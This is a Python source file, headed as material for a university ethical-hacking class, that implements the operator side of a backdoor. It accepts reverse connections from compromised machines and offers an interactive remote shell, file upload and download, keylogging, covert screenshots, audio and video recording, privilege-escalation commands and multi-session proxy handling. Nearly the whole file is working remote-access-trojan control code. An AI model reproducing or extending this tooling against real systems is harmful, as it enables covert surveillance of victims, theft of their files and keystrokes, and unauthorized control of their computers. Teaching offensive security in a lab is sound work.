################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary libraries
import socket  # This library is used for creating socket connections.
import json  # JSON is used for encoding and decoding data in a structured format.
import threading  # For proxy server
import os  # For file operations
import select  # For handling multiple sockets
import time  # For timing operations

# Import configuration
from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT_START, PROXY_PORT_END


# Function to send data reliably as JSON-encoded strings
def reliable_send(data):
    # Convert the input data into a JSON-encoded string.
    jsondata = json.dumps(data)
    # Send the JSON-encoded data over the network connection after encoding it as bytes.
    target.send(jsondata.encode())


# Function to receive data reliably as JSON-decoded strings
def reliable_recv():
    data = ''
    while True:
        try:
            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
            # and remove any trailing whitespace characters.
            data = data + target.recv(1024).decode().rstrip()
            # Parse the received data as a JSON-decoded object.
            return json.loads(data)
        except ValueError:
            continue


# Function to upload a file to the target machine
def upload_file(file_name):
    # Open the specified file in binary read ('rb') mode.
    f = open(file_name, 'rb')
    # Read the contents of the file and send them over the network connection to the target.
    target.send(f.read())
    # Close the file after uploading is complete.
    f.close()


# Function to download a file from the target machine
def download_file(file_name):
    # Open the specified file in binary write ('wb') mode.
    f = open(file_name, 'wb')
    # Set a timeout for receiving data from the target (1 second).
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        # Write the received data (chunk) to the local file.
        f.write(chunk)
        try:
            # Attempt to receive another chunk of data from the target.
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    # Reset the timeout to its default value (None).
    target.settimeout(None)
    # Close the local file after downloading is complete.
    f.close()


# Multi-connection handler for backdoor clients
def handle_backdoor_client(client_socket, client_address):
    """Handle individual backdoor connection"""
    client_id = f"{client_address[0]}:{client_address[1]}"
    print(f'[+] Backdoor Client Connected: {client_id}')
    
    try:
        # Create reliable send/recv functions for this client
        def client_reliable_send(data):
            jsondata = json.dumps(data)
            client_socket.send(jsondata.encode())
        
        def client_reliable_recv():
            data = ''
            while True:
                try:
                    data = data + client_socket.recv(1024).decode().rstrip()
                    return json.loads(data)
                except ValueError:
                    continue
        
        # Handle client communication
        while True:
            try:
                command = input(f'* Shell~{client_id}: ')
                
                if not command:
                    continue
                
                if command == 'quit':
                    client_reliable_send('quit')
                    break
                
                # Send command to client
                client_reliable_send(command)
                
                # Handle different command types (same logic as main session)
                if command.startswith('cd '):
                    result = client_reliable_recv()
                    print(result)
                elif command.startswith('download '):
                    filename = command[9:].strip()
                    download_file_from_client(filename, client_socket)
                elif command.startswith('upload '):
                    filename = command[7:].strip()
                    if filename and os.path.exists(filename):
                        upload_file_to_client(filename, client_socket)
                        result = client_reliable_recv()
                        print(result)
                    else:
                        print(f"File not found: {filename}")
                else:
                    result = client_reliable_recv()
                    print(f"Output:\n{result}")
                    
            except KeyboardInterrupt:
                print(f"\nDisconnecting from {client_id}")
                break
            except Exception as e:
                print(f"Error with client {client_id}: {e}")
                break
                
    except Exception as e:
        print(f'[!] Client {client_id} error: {e}')
    finally:
        client_socket.close()
        print(f'[-] Client Disconnected: {client_id}')

def download_file_from_client(file_name, client_socket):
    """Download file from specific client"""
    f = open(file_name, 'wb')
    client_socket.settimeout(1)
    chunk = client_socket.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client_socket.recv(1024)
        except socket.timeout:
            break
    client_socket.settimeout(None)
    f.close()

def upload_file_to_client(file_name, client_socket):
    """Upload file to specific client"""
    f = open(file_name, 'rb')
    client_socket.send(f.read())
    f.close()


# Function for the main communication loop with the target
def target_communication():
    
    print("BASIC COMMANDS:")
    print("   whoami, dir, ipconfig, pwd, ps, net user")
    print("   cd <path>              - Change directory")
    print("")
    print("FILE OPERATIONS:")
    print("   upload <filename>      - Upload file to target")
    print("   download <filename>    - Download file from target")
    print("")
    print("KEYLOGGER COMMANDS:")
    print("   start_keylog           - Start keylogger")
    print("   stop_keylog            - Stop keylogger")
    print("   get_keylog             - Retrieve logged keys")
    print("")
    print("RECORDING COMMANDS:")
    print("   screenshot             - Take screenshot")
    print("   start_audio            - Start audio recording only")
    print("   stop_audio             - Stop audio recording")
    print("   start_video            - Start video recording only")
    print("   stop_video             - Stop video recording")
    print("   start_recording        - Start both audio & video")
    print("   stop_recording         - Stop both audio & video")
    print("   list_recordings        - List recorded files")
    print("")
    print("PRIVILEGE ESCALATION:")
    print("   check_privs            - Check current privileges")
    print("   escalate               - Attempt privilege escalation")
    print("   privesc_report         - Generate privilege report")
    print("")
    print("MULTI-USER COMMANDS:")
    print("   This is the main session. Proxy users connect independently.")
    print("   Each proxy connection creates a separate backdoor instance.")
    print("")
    print("PROXY COMMANDS:")
    print("   start_proxy            - Start proxy channel (creates new backdoor instances)")
    print("   stop_proxy             - Stop proxy channel")
    print("   proxy_status           - Get proxy status")
    print("")
    print(f"Connected to target: {ip[0]}:{ip[1]}")
    
    while True:
        # Prompt the user for a command to send to the target.
        command = input('* Shell~%s: ' % str(ip))
        
        # Handle empty commands
        if not command:
            continue
            
        # Handle help command locally
        if command == 'help':
            target_communication()
            break
            
        # Send the user's command to the target using the reliable_send function.
        reliable_send(command)
        
        if command.startswith('cd '):
            # Handle directory change
            result = reliable_recv()
            print(result)
        elif command.startswith('download '):
            # If the user enters 'download', initiate the download of a file from the target.
            filename = command[9:].strip()
            download_file(filename)
        elif command.startswith('upload '):
            # If the user enters 'upload', initiate the upload of a file to the target.
            filename = command[7:].strip()
            if filename and os.path.exists(filename):
                upload_file(filename)
                result = reliable_recv()
                print(result)
            elif not filename:
                print("Please specify a filename to upload")
            else:
                print(f"File not found: {filename}")
        elif command in ['start_keylog', 'stop_keylog', 'get_keylog']:
            # Handle keylogger commands
            result = reliable_recv()
            if command == 'start_keylog':
                print(f"Keylogger: {result}")
            elif command == 'stop_keylog':
                print(f"Keylogger: {result}")
            elif command == 'get_keylog':
                print(f"Keylog Data:\n{'-'*40}")
                print(result)
                print("-"*40)
        elif command in ['screenshot', 'start_audio', 'stop_audio', 'staaudio', 'stop_audio', 'start_video', 'stop_video', 'start_rt_video', 'stop_video', 'start_recording', 'stop_recording', 'recording_status', 'list_recordings']:
            # Handle recording commands
            result = reliable_recv()
            if command == 'screenshot':
                if isinstance(result, dict) and result.get('action') == 'screenshot':
                    # Save screenshot to server
                    import base64
                    import os
                    
                    # Create recordings directory if it doesn't exist
                    recordings_dir = "recordings"
                    if not os.path.exists(recordings_dir):
                        os.makedirs(recordings_dir)
                    
                    # Decode and save image
                    image_data = base64.b64decode(result['data'])
                    filepath = os.path.join(recordings_dir, result['filename'])
                    
                    with open(filepath, 'wb') as f:
                        f.write(image_data)
                    
                    print(f"Screenshot saved to: {filepath} ({result['size']} bytes)")
                else:
                    print(f"Screenshot: {result}")
            elif command in ['start_audio', 'start_video', 'start_recording']:
                print(f"Recording: {result}")
            elif command == 'stop_audio':
                if isinstance(result, dict) and result.get('action') == 'audio':
                    # Save audio file to server
                    import base64
                    import os
                    
                    recordings_dir = "recordings"
                    if not os.path.exists(recordings_dir):
                        os.makedirs(recordings_dir)
                    
                    audio_data = base64.b64decode(result['data'])
                    audio_path = os.path.join(recordings_dir, result['filename'])
                    
                    with open(audio_path, 'wb') as f:
                        f.write(audio_data)
                    
                    print(f"Audio saved to: {audio_path} ({result['size']} bytes)")
                else:
                    print(f"Audio: {result}")
            elif command == 'stop_video':
                if isinstance(result, dict) and result.get('action') == 'video':
                    # Save video file to server
                    import base64
                    import os
                    
                    recordings_dir = "recordings"
                    if not os.path.exists(recordings_dir):
                        os.makedirs(recordings_dir)
                    
                    video_data = base64.b64decode(result['data'])
                    video_path = os.path.join(recordings_dir, result['filename'])
                    
                    with open(video_path, 'wb') as f:
                        f.write(video_data)
                    
                    print(f"Video saved to: {video_path} ({result['size']} bytes)")
                else:
                    print(f"Video: {result}")
            elif command == 'stop_recording':
                if isinstance(result, dict) and result.get('action') == 'recording':
                    # Save audio and video files to server
                    import base64
                    import os
                    
                    recordings_dir = "recordings"
                    if not os.path.exists(recordings_dir):
                        os.makedirs(recordings_dir)
                    
                    saved_files = []
                    
                    # Save audio if available
                    if result.get('audio_data'):
                        audio_data = base64.b64decode(result['audio_data'])
                        audio_path = os.path.join(recordings_dir, result['audio_filename'])
                        with open(audio_path, 'wb') as f:
                            f.write(audio_data)
                        saved_files.append(f"Audio: {audio_path} ({result['audio_size']} bytes)")
                    
                    # Save video if available
                    if result.get('video_data'):
                        video_data = base64.b64decode(result['video_data'])
                        video_path = os.path.join(recordings_dir, result['video_filename'])
                        with open(video_path, 'wb') as f:
                            f.write(video_data)
                        saved_files.append(f"Video: {video_path} ({result['video_size']} bytes)")
                    
                    if saved_files:
                        print(f"Recording files saved:\n" + "\n".join(saved_files))
                    else:
                        print("No recording data received")
                else:
                    print(f"Recording: {result}")
            elif command == 'list_recordings':
                # List recordings from server directory
                import os
                recordings_dir = "recordings"
                if os.path.exists(recordings_dir):
                    files = os.listdir(recordings_dir)
                    if files:
                        print(f"Recordings on server ({len(files)} files):")
                        for filename in sorted(files):
                            filepath = os.path.join(recordings_dir, filename)
                            size = os.path.getsize(filepath)
                            print(f"  - {filename} ({size} bytes)")
                    else:
                        print("No recordings found on server")
                else:
                    print("No recordings directory found on server")
                
                # Also show target response
                print(f"\nTarget response: {result}")
        elif command in ['start_proxy', 'stop_proxy', 'proxy_status']:
            # Handle proxy commands
            result = reliable_recv()
            if command == 'start_proxy':
                print(f"Proxy: {result}")
            elif command == 'stop_proxy':
                print(f"Proxy: {result}")
            elif command == 'proxy_status':
                print(f"Proxy Status:\n{'-'*40}")
                print(result)
                print("-"*40)
        elif command in ['check_privs', 'escalate', 'privesc_report']:
            # Handle privilege escalation commands
            result = reliable_recv()
            if command == 'check_privs':
                print(f"Privileges: {result}")
            elif command == 'escalate':
                print(f"Escalation Result:\n{'-'*40}")
                print(result)
                print("-"*40)
            elif command == 'privesc_report':
                print(f"Privilege Report:\n{'-'*40}")
                print(result)
                print("-"*40)

        else:
            # For other commands, receive and print the result from the target.
            result = reliable_recv()
            print(f"Output:\n{result}")



# Multi-connection server setup
def start_multi_connection_server():
    """Start server that can handle multiple backdoor connections"""
    global target, ip
    
    # Create main server socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((SERVER_IP, SERVER_PORT))
    sock.listen(10)  # Allow more concurrent connections
    
    print(f'[+] Multi-Connection Server Listening on {SERVER_IP}:{SERVER_PORT}')
    print(f'[+] Ready for main backdoor and proxy connections')
    
    connection_count = 0
    
    try:
        while True:
            client_socket, client_address = sock.accept()
            connection_count += 1
            
            if connection_count == 1:
                # First connection becomes the main session
                target = client_socket
                ip = client_address
                print(f'[+] Main Backdoor Connected: {client_address}')
                print(f'[+] Starting main interactive session...')
                
                # Start main session in a separate thread
                main_thread = threading.Thread(
                    target=target_communication,
                    daemon=False
                )
                main_thread.start()
            else:
                # Additional connections are handled as independent sessions
                print(f'[+] Additional Connection #{connection_count}: {client_address}')
                
                # Handle each additional connection in its own thread
                client_thread = threading.Thread(
                    target=handle_backdoor_client,
                    args=(client_socket, client_address),
                    daemon=True
                )
                client_thread.start()
                
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    except Exception as e:
        print(f"[!] Server error: {e}")
    finally:
        sock.close()

def start_port_separated_servers():
    """Start both main and proxy servers with port separation"""
    print("[+] Starting Port-Separated Server Architecture")
    print(f"[+] Main Server: {SERVER_IP}:{SERVER_PORT}")
    print(f"[+] Proxy Servers: {SERVER_IP}:{PROXY_PORT_START}-{PROXY_PORT_END}")
    
    # Start proxy servers in background thread
    proxy_thread = threading.Thread(target=start_proxy_servers, daemon=True)
    proxy_thread.start()
    
    # Start main server (blocking)
    start_main_server()

def start_proxy_servers():
    """Start proxy servers on ports 5556-5565"""
    proxy_servers = []
    
    for port in range(PROXY_PORT_START, PROXY_PORT_END + 1):
        try:
            # Create proxy server socket
            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            proxy_sock.bind((SERVER_IP, port))
            proxy_sock.listen(1)  # Each proxy port handles one connection
            
            proxy_servers.append((proxy_sock, port))
            print(f'[+] Proxy Server Ready on {SERVER_IP}:{port}')
            
        except Exception as e:
            print(f'[!] Failed to bind proxy port {port}: {e}')
            continue
    
    print(f'[+] {len(proxy_servers)} Proxy Servers Ready')
    
    # Handle proxy connections
    try:
        while True:
            # Check all proxy sockets for connections
            ready_sockets = [sock for sock, port in proxy_servers]
            
            if ready_sockets:
                ready, _, _ = select.select(ready_sockets, [], [], 1.0)
                
                for ready_sock in ready:
                    # Find which port this socket belongs to
                    for proxy_sock, port in proxy_servers:
                        if proxy_sock == ready_sock:
                            try:
                                client_socket, client_address = proxy_sock.accept()
                                print(f'[+] Proxy Client Connected on Port {port}: {client_address}')
                                
                                # Handle proxy client in separate thread
                                proxy_thread = threading.Thread(
                                    target=handle_proxy_backdoor_client,
                                    args=(client_socket, client_address, port),
                                    daemon=True
                                )
                                proxy_thread.start()
                                
                            except Exception as e:
                                print(f'[!] Error accepting proxy connection on port {port}: {e}')
            
            time.sleep(0.1)  # Small delay to prevent busy waiting
                
    except KeyboardInterrupt:
        print("\\n[!] Proxy servers shutting down...")
    finally:
        for proxy_sock, port in proxy_servers:
            proxy_sock.close()

def handle_proxy_backdoor_client(client_socket, client_address, port):
    """Handle proxy backdoor client connection"""
    client_id = f"{client_address[0]}:{client_address[1]} (Port {port})"
    print(f'[PROXY-{port}] Backdoor session started for {client_id}')
    
    try:
        # Create reliable send/recv functions for this client
        def client_reliable_send(data):
            jsondata = json.dumps(data)
            client_socket.send(jsondata.encode())
        
        def client_reliable_recv():
            data = ''
            while True:
                try:
                    data = data + client_socket.recv(1024).decode().rstrip()
                    return json.loads(data)
                except ValueError:
                    continue
        
        # Handle client commands automatically (non-interactive)
        while True:
            try:
                # Wait for command from client
                command = client_reliable_recv()
                print(f'[PROXY-{port}] Command from {client_id}: {command}')
                
                if command == 'quit':
                    break
                
                # Send response back to client
                client_reliable_send(f"Command '{command}' received on port {port}")
                    
            except Exception as e:
                print(f'[PROXY-{port}] Command error: {e}')
                break
                
    except Exception as e:
        print(f'[PROXY-{port}] Client error: {e}')
    finally:
        client_socket.close()
        print(f'[PROXY-{port}] Client Disconnected: {client_id}')

def start_main_server():
    """Start main backdoor server on port 5555"""
    global target, ip
    
    # Create main server socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((SERVER_IP, SERVER_PORT))
    sock.listen(5)
    
    print(f'[+] Main Backdoor Server Listening on {SERVER_IP}:{SERVER_PORT}')
    
    try:
        # Accept main backdoor connection
        target, ip = sock.accept()
        print(f'[+] Main Backdoor Connected: {ip}')
        
        # Start main interactive session
        target_communication()
                
    except KeyboardInterrupt:
        print("\\n[!] Main server shutting down...")
    except Exception as e:
        print(f"[!] Main server error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    start_port_separated_servers()
